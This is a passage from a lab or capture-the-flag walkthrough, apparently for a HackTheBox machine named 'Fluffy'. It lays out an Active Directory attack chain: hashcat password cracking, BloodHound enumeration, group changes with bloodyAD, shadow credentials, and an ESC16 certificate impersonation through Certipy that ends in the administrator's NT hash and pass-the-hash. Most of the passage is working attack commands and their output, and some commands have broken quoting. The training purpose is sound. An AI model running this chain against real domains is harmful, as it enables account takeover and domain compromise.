+hashcat, a very robust bruteforce / hash cracking tool. We will utilize an extensive wordlist called 'rockyou.txt' to see if we can match
+weak / commonly used / breached credentials to the hash stored in the target domain. 
+
+COMMAND: # hashcat -a 0 -m 5600 p.agila-hash.txt rockyou.txt
+MEANING: # [TOOL][ATTACK MODE][HASH MODE][FILE CONTAINING HASH][WORDLIST FILE]
+
+After a minute, we should get a successful readback of the cracked password: prometheusx-303.
+
+We use NetExec to test both the username and password of p.agila to access SMB and as a result, it shows that we can properly authenticate
+to the domain. At this point, with the permissions we have as p.agila, we want to perform deeper enumeration of the active directory environment
+to see what we can leverage. We can do this with a GUI tool called BloodHound and the data collection tool called BloodHound-Python. 
+
+COMMAND: # bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.10.11.69 -c All --zip
+MEANING: # [TOOL][-U USERNAME][-P USER PASSWORD][-D DOMAIN NAME][-NS NAME SERVER][-C COLLECTION METHOD][ZIPPED OUTPUT]
+
+Once we collect everything, we will be able to analyze everything within the active directory environment ranging from users, permissions, groups,
+service accounts, etc. We take the zip file generated by the bloodhound-python collector and upload it to be ingested by the bloodhound GUI tool. Upon 
+further analysis starting with the p.agila user, we identify a few things.
+
+1. p.agila is a member of the Service Account Managers group.
+2. The Service Account Managers group has GenericAll permissions over the Service Accounts group.
+3. GenericAll permissions essentially equate to FULL CONTROL over the objects associated with the Service Accounts.
+4. The Service Accounts group have GenericWrite permissions over 3 service accounts - WINRM_SVC, LDAP_SVC, and CA_SVC.
+5. Specifically, CA_SVC is a Cert Publisher and has the ability to create certificates for users.
+6. We can use p.agila's GenericAll permissions to add the compromised account to the Service Accounts group using a tool called BloodyAD.
+
+NOTE: BloodyAD is described as an Active Directory Privilege Escalation Swiss Army Knife. This tool performs LDAP calls to a domain controller
+in order to execute changes to an Active Directory Environment.
+
+COMMAND: # bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila
+MEANING: # [TOOL][HOST/TARGET IP][DOMAIN CONTROLLER ADDRESS][USERNAME][PASSWORD][FUNCTION][OBJECT][OBJECT NAME][APPLIED USER]
+
+7. We add p.agila to the Service Accounts group which gives us GenericWrite permissions to create Shadow Credentials and authenticate
+as the 'Principal' - aka CA_SVC and WINRM_SVC.
+8. With the permissions now applied to us as a Service Account under p.agila, we will use a tool known as certipy-ad to create our set
+of Shadow Credentials.
+
+NOTE: Certipy is a powerful offensive and defensive toolkit for enumerating and abusing Active Directory Certificate Services (AD CS). 
+It helps red teamers, penetration testers, and defenders assess AD CS misconfigurations - including full support for identifying and 
+exploiting all known ESC1-ESC16 attack paths. In this case, we are exploiting the ESC16 Vulnerability.
+
+COMMAND: # certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69'
+RESULT: [*] NT hash for 'winrm_svc':33bd09dcd697600edf6b3a7af4875767
+
+9. Using the newly generated credentials for winrm_svc, we can utilize Evil-WinRM to log in as the WinRM Service account, resulting in the
+discovery of the user flag.
+10. We can also do the same with the CA_SVC account using the method above, generating a new hash to use.
+
+RESULT: [*] NT hash for 'ca_svc':ca0f4f9e9eb8a092addf53bb03fc98c8
+
+-------------------------------------
+| CERTIFICATE AUTHORITY ENUMERATION |
+------------------------------------- 
+Using the hash of the CA_SVC account, we can enumerate the domain's Certificate Authority to look for any additional vectors to use.
+
+COMMAND: # certipy-ad find -vulnerable -u CA_SVC -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69
+
+Our Primary Result of Concern:
+------------------------------
+RESULT: [!] Vulnerabilities
+		ESC16
+------------------------------
+This vulnerability, in short: allows ANY user to request certificates as an impersonated user. In this case, we could use the ca_svc user to mimic the
+administrator in order to obtain authentication as the administrator. To do this, we execute the following steps.
+
+1. We want to read the attributes (specifically the User Principal Name (UPN))
+
+COMMAND: # certipy-ad account -u 'p.agila' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read
+RESULT: userPrincipalName: ca_svc@fluffy.htb
+
+2. In order to trick the CA into authenticating as the administrator, we want to update the ca_svc's UPN to match the administrator's sAMAccountName,
+in this case: administrator.
+
+COMMAND: # certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303 -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update
+RESULT:
+---------------------------- 
+[*] Updating user 'ca_svc':
+ userPrincipalName : administrator
+[*] Successfully updated 'ca_svc'
+----------------------------
+3. Request a certificate as the administrator using any client authentication template with the ESC16 vulnerable certificate authority.
+
+COMMAND: # certipy-ad req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA -template 'User'
+
+4. Revert the ca_svc UserPrincipalName as there cannot be multiple users with the same UPN. This will cause authentication issues.
+
+COMMAND: # certipy-ad account -u 'p.agila'@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
+
+5. Then, authenticate as the administrator.
+
+COMMAND # certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
+
+RESULT:
+----------------------------
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+
+6. Pass the Hash with the administrator username to log in once again with Evil-WinRM and obtain the root flag.
